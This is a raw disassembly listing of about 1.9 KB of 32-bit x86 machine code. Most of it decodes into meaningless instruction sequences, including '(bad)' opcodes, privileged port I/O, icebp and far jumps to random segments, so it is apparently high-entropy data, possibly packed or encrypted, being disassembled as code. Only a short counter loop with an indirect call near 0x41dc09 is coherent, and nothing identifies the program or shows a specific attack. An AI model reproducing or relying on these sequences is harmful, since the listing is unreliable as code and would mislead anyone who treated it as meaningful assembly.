  41d830:	les    eax,FWORD PTR [eax+esi*4]
  41d833:	cmp    eax,0x48dff9d3
  41d838:	xchg   ecx,eax
  41d839:	out    0x90,eax
  41d83b:	pop    ds
  41d83c:	or     ah,BYTE PTR [esi]
  41d83e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d83f:	mov    ah,0xae
  41d841:	sbb    eax,0xf4cb424a
  41d846:	push   edx
  41d847:	adc    al,0x17
  41d849:	jmp    0x3b79:0x362bf04c
  41d850:	sahf   
  41d851:	cwde   
  41d852:	mov    eax,DWORD PTR [ebx+0x2c]
  41d855:	cdq    
  41d856:	jns    0x41d821
  41d858:	stc    
  41d859:	jl     0x41d7ed
  41d85b:	repz xchg edx,eax
  41d85d:	push   0xf9c76eab
  41d862:	and    al,0x6b
  41d864:	jo     0x41d7e8
  41d866:	jp     0x41d85f
  41d868:	add    al,0x76
  41d86a:	ins    DWORD PTR es:[edi],dx
  41d86b:	and    ebp,DWORD PTR [ebx]
  41d86d:	lods   al,BYTE PTR ds:[esi]
  41d86e:	xchg   ecx,eax
  41d86f:	bound  ebp,QWORD PTR [esi+0x10d3fb81]
  41d875:	mov    bh,0x1
  41d877:	push   edx
  41d878:	bound  edx,QWORD PTR [eax]
  41d87a:	mov    cl,BYTE PTR [eax-0x36]
  41d87d:	outs   dx,DWORD PTR ds:[esi]
  41d87e:	push   0x1b999bbb
  41d883:	lods   eax,DWORD PTR ds:[esi]
  41d884:	rcl    BYTE PTR [ecx-0x33],1
  41d887:	shl    DWORD PTR [edi+ebx*8],1
  41d88a:	push   es
  41d88b:	xchg   ecx,eax
  41d88c:	pop    eax
  41d88d:	adc    bl,BYTE PTR [ecx+ebx*1]
  41d890:	sbb    ebx,DWORD PTR [eax-0x69c68555]
  41d896:	mov    dh,0x5f
  41d898:	outs   dx,DWORD PTR ds:[esi]
  41d899:	push   esi
  41d89a:	out    0xea,al
  41d89c:	daa    
  41d89d:	dec    esp
  41d89e:	or     BYTE PTR [edx-0x6a],0x57
  41d8a2:	sbb    BYTE PTR [edi+0x51],0xce
  41d8a6:	ins    DWORD PTR es:[edi],dx
  41d8a7:	in     al,dx
  41d8a8:	sub    bl,BYTE PTR [edx-0x27]
  41d8ab:	gs (bad) 
  41d8ad:	icebp  
  41d8ae:	xchg   ebp,eax
  41d8af:	test   BYTE PTR [edi-0x5ad62799],cl
  41d8b5:	(bad)  [esi+edx*8+0x6632117e]
  41d8bc:	mov    BYTE PTR [esi-0x45],dh
  41d8bf:	imul   esi,DWORD PTR [edx],0x9f9832e3
  41d8c5:	fwait
  41d8c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8c7:	xlat   BYTE PTR ds:[ebx]
  41d8c8:	lock jl 0x41d928
  41d8cb:	es jp  0x41d928
  41d8ce:	(bad)  
  41d8cf:	xor    eax,0x7ab0f267
  41d8d4:	test   BYTE PTR [esi],ch
  41d8d6:	xor    DWORD PTR [ebp-0xb4d172d],eax
  41d8dc:	adc    esi,edx
  41d8de:	imul   esp,DWORD PTR [edx-0x67ff38ce],0xffffff96
  41d8e5:	xor    DWORD PTR [eax],ebp
  41d8e7:	scas   eax,DWORD PTR es:[edi]
  41d8e8:	push   ebp
  41d8e9:	cmp    ebx,ecx
  41d8eb:	and    BYTE PTR [ebp-0x2d8f8709],cl
  41d8f1:	add    eax,0x4df4f05c
  41d8f6:	adc    bh,BYTE PTR [ecx-0x5e949245]
  41d8fc:	mul    edi
  41d8fe:	loopne 0x41d8c6
  41d900:	fsubr  QWORD PTR ds:0x91bb88cf
  41d906:	adc    bl,ah
  41d908:	cs add al,dl
  41d90b:	sti    
  41d90c:	cs cmp bh,bh
  41d90f:	xor    DWORD PTR [edx-0x7a29336c],0xffffffc1
  41d916:	mov    dl,0x81
  41d918:	push   ebx
  41d919:	pop    es
  41d91a:	rcr    bl,1
  41d91c:	out    dx,al
  41d91d:	punpckhwd mm5,QWORD PTR [esi+0x6716fcf8]
  41d924:	popa   
  41d925:	fwait
  41d926:	mov    bl,0x42
  41d928:	imul   BYTE PTR [esi]
  41d92a:	and    ch,ah
  41d92c:	xchg   esi,eax
  41d92d:	pop    es
  41d92e:	cmp    esi,0x1f
  41d931:	adc    al,0x2f
  41d934:	popf   
  41d935:	pusha  
  41d936:	mov    eax,ds:0xfdd3af0
  41d93b:	jle    0x41d906
  41d93d:	push   0x139fe480
  41d942:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d943:	outs   dx,BYTE PTR ds:[esi]
  41d944:	jmp    0x8119:0x9c240535
  41d94b:	mov    al,ds:0x1b241dc3
  41d950:	fidivr DWORD PTR [eax]
  41d952:	jmp    0x71345d8e
  41d957:	scas   eax,DWORD PTR es:[edi]
  41d958:	sub    al,0xf2
  41d95a:	fmul   st,st(6)
  41d95c:	imul   esi,DWORD PTR ss:[esi-0x5f],0x34f59432
  41d964:	and    eax,DWORD PTR [eax-0x30]
  41d967:	cli    
  41d968:	jne    0x41d9c8
  41d96a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d96b:	mov    edi,0x593adf47
  41d970:	sbb    dl,BYTE PTR [ebp*4+0x7576da4a]
  41d977:	jb     0x41d9f0
  41d979:	dec    eax
  41d97a:	out    dx,eax
  41d97b:	cmp    ecx,eax
  41d97d:	jo     0x41d987
  41d97f:	add    esp,ebx
  41d981:	mov    ebx,0xb9522be5
  41d986:	mov    dh,0xb2
  41d988:	add    al,0xd4
  41d98a:	jmp    0x255b957b
  41d98f:	dec    ebx
  41d990:	lahf   
  41d991:	sub    DWORD PTR ds:0x6ab5ccc9,ebx
  41d997:	scas   al,BYTE PTR es:[edi]
  41d998:	xchg   esi,eax
  41d999:	or     eax,0x29b27473
  41d99e:	mov    dh,BYTE PTR [ebx]
  41d9a0:	mov    bl,0xc1
  41d9a2:	gs sub eax,0xd5f405f9
  41d9a8:	ret    0xdb1f
  41d9ab:	sub    edx,DWORD PTR [edx]
  41d9ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9ae:	xchg   ebx,eax
  41d9af:	sub    edx,DWORD PTR ds:0x87c183ca
  41d9b5:	dec    esp
  41d9b6:	mov    ah,0xf7
  41d9b8:	int    0x8d
  41d9ba:	lahf   
  41d9bb:	pop    eax
  41d9bc:	ins    DWORD PTR es:[edi],dx
  41d9bd:	and    eax,0x1e74b083
  41d9c2:	pop    esi
  41d9c3:	pop    ecx
  41d9c4:	bnd jno 0x41da23
  41d9c7:	lods   eax,DWORD PTR ds:[esi]
  41d9c8:	and    ebx,DWORD PTR [ecx-0x71c527d3]
  41d9ce:	loopne 0x41d9f0
  41d9d0:	jne    0x41d958
  41d9d2:	inc    ebp
  41d9d3:	or     DWORD PTR [eax+esi*2+0x18],eax
  41d9d7:	test   al,0x61
  41d9d9:	cmc    
  41d9da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9db:	mov    cl,0x9f
  41d9dd:	xor    dh,BYTE PTR [ebx]
  41d9df:	fld    st(5)
  41d9e1:	fcom   DWORD PTR [esi]
  41d9e3:	mov    eax,ds:0x92b729b0
  41d9e8:	push   es
  41d9e9:	mov    BYTE PTR [esi-0x16],0xca
  41d9ed:	popf   
  41d9ee:	or     al,0x18
  41d9f0:	das    
  41d9f1:	mov    esp,0xf8264929
  41d9f6:	out    0xf8,eax
  41d9f8:	test   BYTE PTR [ebx],bl
  41d9fa:	jge    0x41da11
  41d9fc:	xor    eax,0x591c7166
  41da01:	hlt    
  41da02:	nop
  41da03:	psllw  mm6,QWORD PTR [ecx]
  41da06:	mov    ebx,0x954010f7
  41da0b:	mov    al,0x1d
  41da0d:	inc    esi
  41da0e:	cs sti 
  41da10:	lds    edi,FWORD PTR [edx]
  41da12:	cmp    BYTE PTR [esi-0x1d21334e],bh
  41da18:	stos   DWORD PTR es:[edi],eax
  41da19:	div    DWORD PTR [ebx-0x1]
  41da1c:	cmp    edi,DWORD PTR [ebx+0x65b39707]
  41da22:	dec    edi
  41da23:	fcom   st(1)
  41da25:	sub    eax,0x5018afa3
  41da2a:	cmc    
  41da2b:	loope  0x41d9eb
  41da2d:	cli    
  41da2e:	(bad)  
  41da30:	aaa    
  41da31:	or     BYTE PTR [esi+0x48da6bc8],al
  41da37:	sbb    ecx,eax
  41da39:	pusha  
  41da3a:	mov    edi,0xb118ad9b
  41da3f:	aaa    
  41da40:	mov    ebx,0x20b8dd96
  41da45:	cmp    BYTE PTR [eax],0xa3
  41da48:	push   edx
  41da49:	rcl    DWORD PTR [edi+0x66],0xc7
  41da4d:	jcxz   0x41d9e6
  41da50:	lods   eax,DWORD PTR ds:[esi]
  41da51:	adc    al,0xd3
  41da53:	icebp  
  41da54:	fstp   TBYTE PTR [edi-0x2]
  41da57:	imul   edi,DWORD PTR [edi+0x7b],0x5ceade6e
  41da5e:	in     al,dx
  41da5f:	mov    eax,ds:0xa45378f8
  41da64:	stos   BYTE PTR es:[edi],al
  41da65:	xchg   esp,eax
  41da66:	pop    edi
  41da67:	fisubr DWORD PTR [edx]
  41da69:	dec    eax
  41da6a:	scas   eax,DWORD PTR es:[edi]
  41da6b:	lock push esi
  41da6d:	ja     0x41da05
  41da6f:	js     0x41da1f
  41da71:	outs   dx,BYTE PTR ds:[esi]
  41da72:	into   
  41da73:	lods   al,BYTE PTR ds:[esi]
  41da74:	jmp    0x2f3c0b12
  41da79:	jmp    0x3a62d8d4
  41da7e:	jo     0x41da20
  41da80:	inc    edx
  41da81:	rcr    BYTE PTR ds:0x1cd43ff3,0x89
  41da88:	or     DWORD PTR [edx+edx*2-0x43],0xffffff85
  41da8d:	lea    eax,[ecx]
  41da8f:	xor    eax,0x69bc70f1
  41da94:	cmp    eax,0x91710fc1
  41da99:	push   ecx
  41da9a:	jns    0x41db09
  41da9c:	cmp    DWORD PTR [eax],edx
  41da9e:	icebp  
  41da9f:	arpl   di,si
  41daa1:	xchg   ebx,eax
  41daa2:	(bad)  [ecx]
  41daa4:	mov    esi,0x985645dc
  41daa9:	pop    esp
  41daaa:	or     ebx,ebp
  41daac:	sahf   
  41daad:	pop    ebx
  41daae:	xchg   esi,eax
  41daaf:	aad    0x46
  41dab1:	mov    ah,0x3a
  41dab3:	(bad)  
  41dab4:	or     eax,DWORD PTR [ecx+ebx*1+0x6ebe7910]
  41dabb:	inc    esi
  41dabc:	fiadd  DWORD PTR [edi-0x3d]
  41dabf:	test   BYTE PTR [ebx+0x489193ad],0x2a
  41dac6:	pop    edx
  41dac7:	(bad)
  41daca:	test   eax,ebp
  41dacc:	in     al,0x32
  41dace:	aad    0x95
  41dad0:	dec    esi
  41dad1:	mov    eax,ds:0x80f61058
  41dad6:	mov    dl,0xc9
  41dad8:	dec    ebx
  41dad9:	scas   eax,DWORD PTR es:[edi]
  41dada:	xor    esi,DWORD PTR [edx+eiz*4]
  41dadd:	mov    al,ds:0xf5df9b7d
  41dae2:	add    bh,BYTE PTR [ebx+0x48]
  41dae5:	jg     0x41db19
  41dae7:	fdivr  DWORD PTR [edx-0x4d3debe9]
  41daed:	xchg   edx,eax
  41daee:	out    dx,al
  41daef:	popa   
  41daf0:	test   DWORD PTR [ebx],ebx
  41daf2:	aam    0x3
  41daf4:	out    0xf,eax
  41daf6:	push   es
  41daf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41daf8:	mov    edx,0xc95e8575
  41dafd:	mov    ch,0xdf
  41daff:	inc    bp
  41db01:	das    
  41db02:	daa    
  41db03:	pop    ds
  41db04:	(bad)  
  41db05:	add    al,dh
  41db07:	jl     0x41dad5
  41db09:	mov    ecx,0x7a2e83fb
  41db0e:	shl    DWORD PTR [ebp-0x7b85b365],cl
  41db14:	icebp  
  41db15:	xor    BYTE PTR [edi+0x67],ch
  41db18:	test   ch,dh
  41db1a:	sub    al,0x90
  41db1c:	(bad)  
  41db1d:	push   esp
  41db1e:	in     eax,dx
  41db1f:	leave  
  41db20:	pop    esp
  41db21:	and    BYTE PTR [edi-0x22],ah
  41db24:	jle    0x41daf1
  41db26:	pop    ebx
  41db27:	mov    BYTE PTR [ecx],0x67
  41db2a:	or     ebx,ebp
  41db2c:	push   ecx
  41db2d:	mov    ecx,0x51706466
  41db32:	das    
  41db33:	adc    BYTE PTR [ebx+0x49],dh
  41db36:	push   esi
  41db37:	loop   0x41db64
  41db39:	adc    bh,dl
  41db3b:	and    ah,al
  41db3d:	ja     0x41db12
  41db3f:	fstp   TBYTE PTR [ebp+0x58]
  41db42:	ins    BYTE PTR es:[edi],dx
  41db43:	cli    
  41db44:	inc    eax
  41db45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db46:	lods   eax,DWORD PTR ds:[esi]
  41db47:	jl     0x41dae8
  41db49:	and    dl,BYTE PTR [edi]
  41db4b:	mov    ah,BYTE PTR [esi-0x5d]
  41db4e:	into   
  41db4f:	pop    ebx
  41db50:	test   DWORD PTR [eax+0x72731d8d],ecx
  41db56:	loopne 0x41dae3
  41db58:	inc    esp
  41db59:	and    DWORD PTR [esi],eax
  41db5b:	pop    ss
  41db5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db5d:	add    edx,DWORD PTR [esi+edi*4+0x7adc0a45]
  41db64:	or     eax,0x4f4e0705
  41db69:	sbb    edx,DWORD PTR [eax+0x20]
  41db6c:	xchg   edi,eax
  41db6d:	dec    esp
  41db6e:	xchg   edx,eax
  41db6f:	adc    eax,0xdbf290e0
  41db74:	mov    dh,0xbe
  41db76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db77:	stc    
  41db78:	and    bh,cl
  41db7a:	pop    ebp
  41db7b:	(bad)  
  41db7c:	ds xor ah,ah
  41db7f:	pop    ecx
  41db80:	vsqrtss xmm1,xmm5,DWORD PTR [eax-0x7f9b4398]
  41db88:	add    ecx,DWORD PTR [ebx+ebx*8-0x12]
  41db8c:	mov    eax,0x984ed18c
  41db91:	mov    eax,0x98789270
  41db96:	cwde   
  41db97:	mov    edx,0x61f9d2f1
  41db9c:	mov    esp,0x53ff38b5
  41dba1:	test   BYTE PTR [ecx+0x6c],ah
  41dba4:	shr    BYTE PTR [eax+0x50],cl
  41dba7:	push   cs
  41dba8:	add    BYTE PTR [edx+0x5e1429dd],ch
  41dbae:	(bad)  
  41dbaf:	xor    edx,DWORD PTR fs:[esi]
  41dbb2:	mov    edx,0xdc9b4f2b
  41dbb7:	cmp    bl,BYTE PTR [esi]
  41dbb9:	and    BYTE PTR [ebp+0x7a1f4a47],0x17
  41dbc0:	jl     0x41dc1e
  41dbc2:	mov    ecx,0xb5ca0967
  41dbc7:	lahf   
  41dbc8:	mov    WORD PTR [edx],fs
  41dbca:	test   eax,0x9b28f5ab
  41dbcf:	mov    esi,0xa541f442
  41dbd4:	inc    edi
  41dbd5:	and    eax,0xd30766fe
  41dbda:	mov    esp,0x334c5c64
  41dbdf:	mov    WORD PTR [eax],cs
  41dbe1:	mov    esp,0x6d5b0fd9
  41dbe6:	popf   
  41dbe7:	ins    BYTE PTR es:[edi],dx
  41dbe8:	sbb    al,0x8
  41dbea:	pop    ds
  41dbeb:	sti    
  41dbec:	mov    dl,0x22
  41dbee:	inc    esp
  41dbef:	mov    eax,0x8bf04589
  41dbf4:	or     eax,0x42b1de
  41dbf9:	and    DWORD PTR ds:0x42b212,ecx
  41dbff:	xor    DWORD PTR [ebp-0x10],0xf89cb5a5
  41dc06:	mov    eax,DWORD PTR [ebp-0x18]
  41dc09:	mov    DWORD PTR ds:0x42b19a,0x12
  41dc13:	cmp    DWORD PTR ds:0x42b19a,0x0
  41dc1a:	je     0x41fffa
  41dc20:	cmp    DWORD PTR ds:0x42b19a,0x4
  41dc27:	jle    0x41fffa
  41dc2d:	jmp    0x41dc3b
  41dc32:	push   DWORD PTR [ebp-0x18]
  41dc35:	call   DWORD PTR ds:0x42b2f2
  41dc3b:	cmp    DWORD PTR ds:0x42b19a,0x5
  41dc42:	jne    0x41dc57
  41dc48:	xor    ecx,ecx
  41dc4a:	add    ecx,DWORD PTR ds:0x42b19a
  41dc50:	dec    ecx
  41dc51:	mov    DWORD PTR ds:0x42b19a,ecx
  41dc57:	mov    ecx,DWORD PTR ds:0x42b19a
  41dc5d:	dec    ecx
  41dc5e:	mov    DWORD PTR ds:0x42b19a,ecx
  41dc64:	jmp    0x41dc13
  41dc69:	jmp    0x41fffa
  41dc6e:	push   cs
  41dc6f:	mov    BYTE PTR [edi-0x79d57893],0x82
  41dc76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc77:	mov    dl,0xfb
  41dc79:	cs push ds
  41dc7b:	mov    al,ds:0xdb7a5469
  41dc80:	add    BYTE PTR [ebx-0x7c7ca1f1],0xe5
  41dc87:	scas   eax,DWORD PTR es:[edi]
  41dc88:	popf   
  41dc89:	ror    edi,1
  41dc8b:	fist   WORD PTR [eax+ecx*1]
  41dc8e:	push   edi
  41dc8f:	cmp    DWORD PTR [ebp-0x52],ebx
  41dc92:	mov    bh,0x22
  41dc94:	add    DWORD PTR [ecx+0x1a],esi
  41dc97:	out    0xec,eax
  41dc99:	lods   eax,DWORD PTR ds:[esi]
  41dc9a:	mov    dh,0x31
  41dc9c:	out    dx,al
  41dc9d:	loopne 0x41dc74
  41dc9f:	inc    ecx
  41dca0:	sub    edx,DWORD PTR [ebx+esi*4]
  41dca3:	out    dx,al
  41dca4:	push   es
  41dca5:	mov    ecx,0x5bbfae
  41dcaa:	mov    DWORD PTR ds:[ecx-0xba778d2],0x5a4f73df
  41dcb5:	ins    BYTE PTR es:[edi],dx
  41dcb6:	push   ds
  41dcb7:	mov    al,0xec
  41dcb9:	cmp    esp,ecx
  41dcbb:	lds    eax,FWORD PTR [ebx]
  41dcbd:	stos   BYTE PTR es:[edi],al
  41dcbe:	dec    edx
  41dcbf:	ss lahf 
  41dcc1:	out    dx,al
  41dcc2:	aaa    
  41dcc3:	in     eax,dx
  41dcc4:	call   0xb12773a
  41dcc9:	mov    cs,WORD PTR [esi+0x1b]
  41dccc:	(bad)  
  41dccd:	push   cs
  41dcce:	loopne 0x41dce8
  41dcd0:	imul   ecx,edi,0x31b60a62
  41dcd6:	nop
  41dcd7:	test   BYTE PTR [edx+0x8743de1],bl
  41dcdd:	ja     0x41dd4f
  41dcdf:	jge    0x41dced
  41dce1:	nop
  41dce2:	adc    BYTE PTR [eax-0x5],dh
  41dce5:	push   ebx
  41dce6:	jbe    0x41dca6
  41dce8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dce9:	xchg   ecx,eax
  41dcea:	push   edi
  41dceb:	clc    
  41dcec:	gs cmp al,0xae
  41dcef:	mov    ds:0xc3eeba5e,eax
  41dcf4:	out    0x42,eax
  41dcf6:	cmc    
  41dcf7:	cmp    ecx,DWORD PTR [ecx-0x5a]
  41dcfa:	call   0xae0df0bd
  41dcff:	xchg   edx,eax
  41dd00:	sub    eax,DWORD PTR [ebx+0x3]
  41dd03:	not    DWORD PTR [eax-0x65]
  41dd06:	in     al,dx
  41dd07:	imul   edx,DWORD PTR [ebp+edx*8+0x10b552d3],0xffffffb3
  41dd0f:	dec    ebx
  41dd10:	mov    esi,0xf91e19ec
  41dd15:	int    0xf8
  41dd17:	into   
  41dd18:	mov    ds:0xac70f34d,eax
  41dd1d:	add    ah,bl
  41dd1f:	scas   al,BYTE PTR es:[edi]
  41dd20:	add    BYTE PTR [ebx-0x13],dl
  41dd23:	push   ebp
  41dd24:	(bad)  [edx]
  41dd26:	or     edi,DWORD PTR [edi-0x6d]
  41dd29:	cli    
  41dd2a:	dec    edx
  41dd2b:	push   ss
  41dd2c:	and    eax,0x65e17a34
  41dd31:	inc    edi
  41dd32:	mov    dl,0x56
  41dd34:	stos   BYTE PTR es:[edi],al
  41dd35:	lea    ebp,[edx+0xe]
  41dd38:	push   ss
  41dd39:	rol    DWORD PTR [edi],0xa6
  41dd3c:	fadd   st(4),st
  41dd3e:	dec    ebx
  41dd3f:	pusha  
  41dd40:	sub    ebx,ebp
  41dd42:	arpl   WORD PTR [eax-0x38],bp
  41dd45:	ins    DWORD PTR es:[edi],dx
  41dd46:	mov    esi,0x8bfe9bbe
  41dd4b:	sahf   
  41dd4c:	sbb    ah,BYTE PTR ds:0x9dd80269
  41dd52:	lods   al,BYTE PTR ds:[esi]
  41dd53:	pcmpgtb mm1,QWORD PTR [ebx-0x4837f4fe]
  41dd5a:	cdq    
  41dd5b:	and    eax,0xe7c974e0
  41dd60:	sub    edi,DWORD PTR [edi]
  41dd62:	mov    ah,0xc5
  41dd64:	aad    0xb
  41dd66:	pop    esi
  41dd67:	or     dh,BYTE PTR [eax]
  41dd69:	and    BYTE PTR [eax-0x7b],0x3d
  41dd6d:	test   eax,0x8029a3c
  41dd72:	pop    es
  41dd73:	outs   dx,DWORD PTR ds:[esi]
  41dd74:	pop    esi
  41dd75:	popf   
  41dd76:	out    0x99,al
  41dd78:	(bad)  
  41dd79:	fsub   DWORD PTR [ebx-0x38]
  41dd7c:	nop
  41dd7d:	mov    ecx,0x81776dac
  41dd82:	ss (bad) 
  41dd84:	mov    edi,0xef2eea3b
  41dd89:	xchg   edx,eax
  41dd8a:	aam    0x7f
  41dd8c:	xchg   BYTE PTR [edx+0x0],cl
  41dd8f:	jmp    0xcda0:0xbcd970a3
  41dd96:	aam    0x4f
  41dd98:	jp     0x41dddb
  41dd9a:	dec    ebp
  41dd9b:	das    
  41dd9c:	in     eax,dx
  41dd9d:	dec    ebp
  41dd9e:	adc    esi,ebp
  41dda0:	pop    esp
  41dda1:	rcr    DWORD PTR [edi+0x16],0xc2
  41dda5:	xlat   BYTE PTR ds:[ebx]
  41dda6:	std    
  41dda7:	jmp    0xbed3:0x9c5306cc
  41ddae:	dec    eax
  41ddaf:	push   esp
  41ddb0:	outs   dx,DWORD PTR ds:[esi]
  41ddb1:	pop    ecx
  41ddb2:	xor    bh,ch
  41ddb4:	loop   0x41de26
  41ddb6:	out    dx,al
  41ddb7:	in     al,0x90
  41ddb9:	jp     0x41dd96
  41ddbb:	mov    ebx,0xfb0a836e
  41ddc0:	pop    edx
  41ddc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ddc2:	rcl    BYTE PTR gs:[ecx],cl
  41ddc5:	shl    BYTE PTR [edx-0x57],1
  41ddc8:	test   DWORD PTR [ecx],0x39ed26c8
  41ddce:	inc    eax
  41ddcf:	mov    ds,WORD PTR [ebx+0x40]
  41ddd2:	stos   DWORD PTR es:[edi],eax
  41ddd3:	push   cs
  41ddd4:	jbe    0x41ddca
  41ddd6:	mov    dh,0xb9
  41ddd8:	inc    ecx
  41ddd9:	jmp    0x41dd6f
  41dddb:	inc    edi
  41dddc:	aas    
  41dddd:	out    0xde,eax
  41dddf:	aas    
  41dde0:	lods   eax,DWORD PTR ds:[esi]
  41dde1:	xor    eax,0xc3ec79d9
  41dde6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dde7:	daa    
  41dde8:	inc    esi
  41dde9:	test   BYTE PTR [eax+0x2d44d400],dh
  41ddef:	mov    dl,0xb3
  41ddf1:	push   esp
  41ddf2:	ss jge 0x41de16
  41ddf5:	call   0x8519d4c4
  41ddfa:	jns    0x41de55
  41ddfc:	(bad)  
  41ddfd:	dec    esp
  41ddfe:	sub    edx,0xa07d7178
  41de04:	imul   ebp,DWORD PTR [edi+0x7b],0xffffffa2
  41de08:	test   cl,al
  41de0a:	lea    ecx,[ebp+0x1cdb28cd]
  41de10:	sub    ch,BYTE PTR [esi+0x55]
  41de13:	outs   dx,DWORD PTR ds:[esi]
  41de14:	mov    al,ds:0x8f0b5448
  41de19:	es dec edx
  41de1b:	lods   al,BYTE PTR ds:[esi]
  41de1c:	sub    BYTE PTR [esp+ebp*1],bh
  41de1f:	adc    BYTE PTR [edx+0x10],bl
  41de22:	dec    ecx
  41de23:	pop    esp
  41de24:	lods   al,BYTE PTR ds:[esi]
  41de25:	fild   QWORD PTR ds:0x51515a51
  41de2b:	sbb    edi,DWORD PTR [ecx-0x2e2bad7d]
  41de31:	shl    BYTE PTR [ecx-0x11d45a4b],1
  41de37:	push   ebx
  41de38:	cli    
  41de39:	jmp    0x5e4e:0x870ff0a2
  41de40:	call   0xc1a6:0xb1917794
  41de47:	dec    esp
  41de48:	enter  0x52b7,0x27
  41de4c:	inc    ebp
  41de4d:	xor    al,0x32
  41de4f:	mov    ebp,0x4e3c8635
  41de54:	es dec ebp
  41de56:	test   BYTE PTR [esi-0x41],ch
  41de59:	and    al,0xc8
  41de5b:	dec    edx
  41de5c:	mov    ah,0x2e
  41de5e:	test   al,0x8c
  41de60:	lods   eax,DWORD PTR ds:[esi]
  41de61:	inc    esi
  41de62:	push   edx
  41de63:	add    BYTE PTR [eax+ebp*8+0x315bf9a9],cl
  41de6a:	mov    bl,0x99
  41de6c:	imul   eax,DWORD PTR [edi-0x75],0xf6d2ed3d
  41de73:	es dec esi
  41de75:	imul   edi,DWORD PTR [ecx+0x4024da4],0x78
  41de7c:	xlat   BYTE PTR ds:[ebx]
  41de7d:	test   ebx,esi
  41de7f:	je     0x41de47
  41de81:	fbld   TBYTE PTR [ebx+0x4ea0f99e]
  41de87:	psubsw mm3,mm4
  41de8a:	jne    0x41dea0
  41de8c:	ins    BYTE PTR es:[edi],dx
  41de8d:	(bad)  
  41de8e:	mov    ds:0x6f801e92,al
  41de93:	popf   
  41de94:	shl    DWORD PTR [esi],0x6a
  41de97:	push   esi
  41de98:	(bad)  
  41de99:	loope  0x41de91
  41de9b:	mov    eax,0x194466c1
  41dea0:	je     0x41de45
  41dea2:	jo     0x41de82
  41dea4:	push   eax
  41dea5:	out    0x73,eax
  41dea7:	fistp  WORD PTR [ebx-0x463ffe17]
  41dead:	ds xchg ebp,eax
  41deaf:	dec    ebx
  41deb0:	push   ecx
  41deb1:	dec    edx
  41deb2:	(bad)  
  41deb3:	test   DWORD PTR [ebx+0xd38ffa9],0x28db3673
  41debd:	mov    ebp,0x6b2470ba
  41dec2:	push   esp
  41dec3:	retf   0x90d4
  41dec6:	fmul   DWORD PTR [edx]
  41dec8:	pop    edx
  41dec9:	pop    ds
  41deca:	xchg   dl,al
  41decc:	pushf  
  41decd:	push   ss
  41dece:	sti    
  41decf:	fnstsw WORD PTR [ecx]
  41ded1:	or     eax,0xfd4bf23
  41ded6:	jns    0x41df23
  41ded8:	(bad)  
  41ded9:	(bad)  
  41dedb:	push   0x1061f34b
  41dee0:	xchg   esi,eax
  41dee1:	mov    edi,0x8c687956
  41dee6:	fild   QWORD PTR [eax-0x6628f21a]
  41deec:	sar    BYTE PTR [ebx-0x16],0x80
  41def0:	sub    cl,BYTE PTR [edi+0x2594b9aa]
  41def6:	icebp  
  41def7:	repz inc esp
  41def9:	sbb    esp,ebx
  41defb:	mov    ds,WORD PTR [ebp+0x39]
  41defe:	xor    al,ch
  41df00:	inc    ebx
  41df01:	inc    edx
  41df02:	jp     0x41df3d
  41df04:	ss scas eax,DWORD PTR es:[edi]
  41df06:	call   0xb2086cd2
  41df0b:	push   edx
  41df0c:	stos   BYTE PTR es:[edi],al
  41df0d:	jne    0x41def2
  41df0f:	repz sahf 
  41df11:	inc    esp
  41df12:	in     eax,0x21
  41df14:	adc    eax,0xb31d8a3a
  41df19:	out    0x20,eax
  41df1b:	in     eax,dx
  41df1c:	mov    al,0xff
  41df1e:	sbb    al,0xce
  41df20:	imul   esi,DWORD PTR [edx],0xffffffbd
  41df23:	hlt    
  41df24:	xor    ch,BYTE PTR [eax+0x16]
  41df27:	dec    eax
  41df28:	fsub   DWORD PTR [edx]
  41df2a:	mov    ebp,0x3ee2df05
  41df2f:	mov    edx,0x84e85119
  41df34:	mov    esp,0xff6de40
  41df39:	rcr    BYTE PTR [eax+0x7290ca1],1
  41df3f:	data16 daa 
  41df41:	out    0x21,eax
  41df43:	in     al,0x39
  41df45:	inc    BYTE PTR [ebx+0x58f9e418]
  41df4b:	das    
  41df4c:	enter  0xbce2,0x81
  41df50:	mov    eax,0x6c623e7c
  41df55:	cmp    ebp,DWORD PTR ds:0x47aed4dc
  41df5b:	repnz pop ecx
  41df5d:	retf   0xccd2
  41df60:	cwde   
  41df61:	xchg   ecx,eax
  41df62:	shl    BYTE PTR [eax+0x4d7a3a9c],1
  41df68:	daa    
  41df69:	mov    dh,BYTE PTR [edx]
  41df6b:	jno    0x41dfc9
  41df6d:	pop    ebx
  41df6e:	mov    eax,ds:0x355b83c7
  41df73:	xor    bh,ch
  41df75:	push   cs
  41df76:	mov    al,BYTE PTR [eax+eax*1-0x4f]
  41df7a:	lds    ebx,FWORD PTR ds:0x6f4bd617
  41df80:	dec    eax
  41df81:	sti    
  41df82:	(bad)  
  41df83:	retf   
  41df84:	imul   eax,esi,0xfcc07e62
  41df8a:	cmp    eax,0xa4c9aa85
  41df8f:	or     edx,DWORD PTR ds:0x192e3a62
  41df95:	aaa    
  41df96:	gs fld st(6)
  41df99:	mov    dh,0x6
  41df9b:	pop    ss
  41df9c:	dec    edi
  41df9d:	into   
  41df9e:	lods   eax,DWORD PTR ds:[esi]
  41df9f:	aaa    
  41dfa0:	ror    cl,0xd6
  41dfa3:	pop    edi
  41dfa4:	clc    
  41dfa5:	push   ds
  41dfa6:	in     al,dx
  41dfa7:	pop    ebp
  41dfa8:	or     al,0x24
  41dfaa:	rep lods eax,DWORD PTR ds:[esi]
  41dfac:	ja     0x41e01f
  41dfae:	xchg   esp,eax
  41dfaf:	add    al,0x2a
  41dfb1:	pop    DWORD PTR [esi+eax*2-0x5f]
  41dfb5:	xor    ecx,DWORD PTR [edi]
  41dfb7:	mov    esi,0x1ace8df7
  41dfbc:	rol    bl,cl
